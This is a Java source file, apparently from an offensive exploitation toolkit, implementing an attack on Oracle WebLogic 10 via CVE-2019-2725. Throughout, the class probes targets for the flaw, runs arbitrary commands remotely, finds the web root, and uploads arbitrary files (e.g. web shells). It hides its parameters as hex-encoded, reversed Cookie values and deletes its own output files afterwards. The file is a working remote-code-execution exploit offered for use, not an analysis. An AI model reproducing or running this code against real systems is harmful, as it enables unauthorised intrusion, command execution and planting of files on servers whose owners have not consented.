package fun.fireline.exp.oracle.weblogic;

import fun.fireline.core.ExploitInterface;
import fun.fireline.tools.HttpTools;
import fun.fireline.tools.Response;
import fun.fireline.tools.Tools;

import java.util.HashMap;

/**
 * @author yhy
 * @date 2021/8/21 21:25
 * @github https://github.com/yhy0
 *
 * CVE-2019-2725 Weblogic10
 */

public class CVE_2019_2725_10_bypass implements ExploitInterface {
    private String target = null;
    private boolean isVul = false;
    private HashMap<String, String> headers = new HashMap();

    private static final String VULURL = "/_async/AsyncResponseService";
    private static final String FileAbsPath = "/_async/";

    @Override
    public String checkVul(String url) {
        this.target = url;

        String VUL_CMD = Tools.getExp("exp/weblogic/weblogic10_file_bypass.txt");
        String responsePath = Tools.getRandomString(6) + ".txt";

        String data = Tools.str2Hex("a$$$$" + responsePath + "$$$$" + "xml_test");
        data = Tools.reverse(data);

        this.headers.put("Content-type", "text/xml");
        this.headers.put("Cookie", data);

        HttpTools.post(this.target + VULURL, VUL_CMD, this.headers, "UTF-8");

        this.headers.remove("Cookie");
        Response response = HttpTools.get(this.target + FileAbsPath + responsePath, this.headers, "UTF-8");

        data = Tools.str2Hex(responsePath);
        data = Tools.reverse(data);

        this.headers.put("Cookie", data);

        HttpTools.post(this.target + VULURL, Tools.getExp("exp/weblogic/weblogic10_deleteFile_bypass.txt"), this.headers, "UTF-8");


        if (response.getText() != null && response.getText().contains("xml_test")) {
            this.isVul = true;
            return "[+] 目标存在" + this.getClass().getSimpleName() + "漏洞 \t O(∩_∩)O~";
        } else if (response.getError() != null) {
            return "[-] 检测漏洞" + this.getClass().getSimpleName() + "失败， " + response.getError();
        } else {
            return "[-] 目标不存在" + this.getClass().getSimpleName() + "漏洞";
        }

    }

    @Override
    public String exeCmd(String cmd, String encoding) {

        String responsePath = Tools.getRandomString(6) + ".txt";
        String data = Tools.str2Hex(cmd + "$$$$" + responsePath);
        data = Tools.reverse(data);
        this.headers.put("Content-type", "text/xml");
        this.headers.put("Cookie", data);


        String VUL_CMD = Tools.getExp("exp/weblogic/weblogic10_cmd_bypass.txt");

        HttpTools.post(this.target + VULURL, VUL_CMD, this.headers, encoding);

        this.headers.remove("Cookie");
        Response response = HttpTools.get(this.target + FileAbsPath + responsePath, this.headers, encoding);

        data = Tools.str2Hex(responsePath);
        data = Tools.reverse(data);
        this.headers.put("Cookie", data);
        HttpTools.post(this.target + VULURL, Tools.getExp("exp/weblogic/weblogic10_deleteFile_bypass.txt"), this.headers, encoding);

        return response.getText();
    }

    @Override
    public String getWebPath() {

        String responsePath = Tools.getRandomString(6) + ".txt";

        String data = Tools.str2Hex(responsePath);
        data = Tools.reverse(data);
        this.headers.put("Content-type", "text/xml");
        this.headers.put("Cookie", data);


        String VUL_CMD = Tools.getExp("exp/weblogic/weblogic10_path_bypass.txt");

        HttpTools.post(this.target + VULURL, VUL_CMD, this.headers, "UTF-8");

        this.headers.remove("Cookie");
        Response response = HttpTools.get(this.target + FileAbsPath + responsePath, this.headers, "UTF-8");

        data = Tools.str2Hex(responsePath);
        data = Tools.reverse(data);
        this.headers.put("Cookie", data);
        HttpTools.post(this.target + VULURL, Tools.getExp("exp/weblogic/weblogic10_deleteFile_bypass.txt"), this.headers, "UTF-8");

        return Tools.regReplace(response.getText());
    }

    @Override
    public String uploadFile(String fileContent, String filename, String platform) throws Exception {
        String result = "";
        String o = "a";
        String respath = this.target + FileAbsPath + filename;
        if (filename.contains("/")) {
            o = "path";
            respath = filename;
        }


        String data = Tools.str2Hex(o + "$$$$" + filename + "$$$$" + fileContent);
        data = Tools.reverse(data);

        this.headers.put("Content-type", "text/xml");
        this.headers.put("Cookie", data);

        String VUL_File = Tools.getExp("exp/weblogic/weblogic10_file_bypass.txt");
        HttpTools.post(this.target + VULURL, VUL_File, this.headers, "UTF-8");

        this.headers.remove("Cookie");

        Response response = HttpTools.get(respath, this.headers, "UTF-8");
        if(response.getCode() == 200) {
            result = result + "  上传成功! " + respath;
        } else {
            result = "上传失败 " +respath;
        }

        return result;
        
    }

    @Override
    public boolean isVul() {
        return this.isVul;
    }
}
